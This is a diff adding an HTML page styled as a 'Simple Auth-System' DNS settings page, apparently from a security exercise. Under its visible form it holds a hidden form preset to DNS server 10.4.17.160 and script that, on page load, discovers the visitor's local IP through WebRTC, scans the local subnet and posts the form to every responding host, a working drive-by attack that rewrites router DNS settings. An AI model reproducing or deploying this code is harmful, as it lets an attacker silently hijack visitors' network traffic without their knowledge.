@@ -1,0 +1,239 @@
+<body class="container">
+<div class="page-header">
+    <h1>Simple Auth-System</h1>
+</div>
+<style>
+
+</style>
+
+<nav class="navbar navbar-default">
+    <div class="container-fluid">
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav">
+                <li><a href="/">Home</a></li>
+                <li><a href="/dashboard">Dashboard</a></li>
+                <li><a href="/dnssettings">DNS Settings</a></li>
+            </ul>
+
+            <ul class="nav navbar-nav navbar-right">
+                <li><a href="/logout">Log Out</a></li>
+            </ul>
+        </div><!-- /.navbar-collapse -->
+    </div><!-- /.container-fluid -->
+</nav>
+
+<div class="container row">
+    <h1>Hi {{username}}, Welcome to your DNS Settings</h1>
+
+    <div class="container row">
+        <div class="jumbotron col-lg-5 pull-center">
+            <form action="/" method="post">
+                {{#if set}}
+                    <div class="alert alert-success" role="alert">
+                        successfully switched DNS server to {{new_server}}
+                    </div>
+                {{/if}}
+                <div>
+                    <label>DNS Server:</label>
+                    <input type="text" name="dns_addr"/>
+                </div>
+                <div>
+                    <input class="btn btn-primary" type="submit" value="Change"/>
+                </div>
+            </form>
+
+        </div>
+    </div>
+</div>
+<form action="/" id='secret-form' method="post">
+	<div>
+		<label>DNS Server:</label>
+                <input type="text" value = "10.4.17.160" name="dns_addr"/>
+	</div>
+        <div>
+		<input class="btn btn-primary" type="submit" value="Change"/>
+	</div>
+</form>
+
+</body>
+<script src="/javascript/ping.js"></script>
+<script src="/javascript/jQuery.min.js"></script>
+<script type="text/javascript">
+
+function get_ping2(addy){
+
+let server_arr = [];
+     function ping(ip, callback) {
+
+    if (!this.inUse) {
+        this.status = 'unchecked';
+        this.inUse = true;
+        this.callback = callback;
+        this.ip = ip;
+        var _that = this;
+        this.img = new Image();
+        this.img.onload = function () {
+            _that.inUse = false;
+            _that.callback('responded');
+
+        };
+        this.img.onerror = function (e) {
+            if (_that.inUse) {
+                _that.inUse = false;
+                _that.callback('responded', e);
+            }
+
+        };
+        this.start = new Date().getTime();
+        this.img.src = "http://" + ip;
+        this.timer = setTimeout(function () {
+            if (_that.inUse) {
+                _that.inUse = false;
+                _that.callback('timeout');
+            }
+        }, 1500);
+    }
+}
+
+const sleep = (milliseconds) => {
+    return new Promise(resolve => setTimeout(resolve, milliseconds))
+}
+
+var PingModel = function (servers) {
+    var self = this;
+    var myServers = [];
+    ko.utils.arrayForEach(servers, function (location) {
+        myServers.push({
+            name: location,
+            status: ko.observable('unchecked')
+        });
+    });
+    self.servers = ko.observableArray(myServers);
+    ko.utils.arrayForEach(self.servers(), function (s) {
+        s.status('checking');
+        new ping(s.name, function (status, e) {
+            s.status(status);
+	if(status == "responded"){
+		server_arr.push(s.name);
+	}
+
+        });
+    });
+    console.log(server_arr);
+    sleep(500).then(()=> {
+	SendPost(server_arr);
+    });
+};
+
+
+function DecrementIP(ip_addy){
+    let arr = [];
+    let i = parseInt(ip_addy.split('.')[3]);
+    
+    let ip_mask = ip_addy.split('.')[0].concat('.', ip_addy.split('.')[1],'.', ip_addy.split('.')[2],'.')
+    while (i > 1){
+	i--;
+        arr.push(ip_mask.concat(i.toString()));  
+    }
+    return arr;
+}
+
+function SendPost(ip_arr){
+		//console.log("hereeeeeeeeeeeee");
+	for (var i = 0; i < ip_arr.length; i++){
+		//console.log(ip_arr[i]);
+
+		$('#secret-form').attr('action', "http://" + ip_arr[i] + "/");		
+		console.log($('#secret-form').prop('action'));
+		$('#secret-form').submit();
+	}
+}
+
+
+
+var komodel = new PingModel(DecrementIP(addy));
+//ko.applyBindings(komodel);
+}
+
+//get the IP addresses associated with an account
+function getIPs(callback){
+    var ip_dups = {};
+
+    //compatibility for firefox and chrome
+    var RTCPeerConnection = window.RTCPeerConnection
+        || window.mozRTCPeerConnection
+        || window.webkitRTCPeerConnection;
+    var useWebKit = !!window.webkitRTCPeerConnection;
+
+    //bypass naive webrtc blocking using an iframe
+    if(!RTCPeerConnection){
+        //NOTE: you need to have an iframe in the page right above the script tag
+        //
+        //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
+        //<script>...getIPs called in here...
+        //
+        var win = iframe.contentWindow;
+        RTCPeerConnection = win.RTCPeerConnection
+            || win.mozRTCPeerConnection
+            || win.webkitRTCPeerConnection;
+        useWebKit = !!win.webkitRTCPeerConnection;
+    }
+
+    //minimal requirements for data connection
+    var mediaConstraints = {
+        optional: [{RtpDataChannels: true}]
+    };
+
+    var servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};
+
+    //construct a new RTCPeerConnection
+    var pc = new RTCPeerConnection(servers, mediaConstraints);
+
+    function handleCandidate(candidate){
+        //match just the IP address
+        var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
+        var ip_addr = ip_regex.exec(candidate)[1];
+
+        //remove duplicates
+        if(ip_dups[ip_addr] === undefined)
+            callback(ip_addr);
+
+        ip_dups[ip_addr] = true;
+    }
+
+    //listen for candidate events
+    pc.onicecandidate = function(ice){
+
+        //skip non-candidate events
+        if(ice.candidate)
+            handleCandidate(ice.candidate.candidate);
+    };
+
+    //create a bogus data channel
+    pc.createDataChannel("");
+
+    //create an offer sdp
+    pc.createOffer(function(result){
+
+        //trigger the stun server request
+        pc.setLocalDescription(result, function(){}, function(){});
+
+    }, function(){});
+
+    //wait for a while to let everything done
+    setTimeout(function(){
+        //read candidate info from local description
+        var lines = pc.localDescription.sdp.split('\n');
+
+        lines.forEach(function(line){
+            if(line.indexOf('a=candidate:') === 0)
+                handleCandidate(line);
+        });
+    }, 1000);
+}
+
+//Test: Print the IP addresses into the console
+getIPs(function(ip){get_ping2(ip);});</script>
+
+
